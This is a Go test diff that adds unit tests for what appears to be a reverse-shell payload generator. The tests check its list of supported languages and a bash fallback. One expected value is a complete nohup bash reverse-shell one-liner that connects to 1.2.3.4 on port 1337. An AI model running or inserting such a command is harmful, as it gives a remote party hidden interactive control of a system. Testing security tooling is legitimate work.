@@ -57,3 +57,31 @@ func TestURI2Command(t *testing.T) {
 		}
 	}
 }
+
+func TestLanguages_ExpectedKeys(t *testing.T) {
+	got := Languages()
+	want := []string{"bash", "go", "lua", "nc", "perl", "php", "python", "python2", "python3", "ruby"}
+	if len(got) != len(want) {
+		t.Fatalf("len = %d, want %d (got %v)", len(got), len(want), got)
+	}
+	for i := range want {
+		if got[i] != want[i] {
+			t.Errorf("[%d] = %q, want %q", i, got[i], want[i])
+		}
+	}
+}
+
+func TestRender_Bash(t *testing.T) {
+	got := Render("1.2.3.4", 1337, "bash")
+	want := `/usr/bin/nohup /bin/bash -c '/bin/bash -i >/dev/tcp/1.2.3.4/1337 0>&1 &' >/dev/null`
+	if got != want {
+		t.Errorf("\nwant: %s\ngot:  %s", want, got)
+	}
+}
+
+func TestRender_UnknownFallsBackToBash(t *testing.T) {
+	got := Render("1.2.3.4", 1337, "not-a-language")
+	if want := Render("1.2.3.4", 1337, "bash"); got != want {
+		t.Errorf("fallback mismatch:\nwant %s\ngot  %s", want, got)
+	}
+}
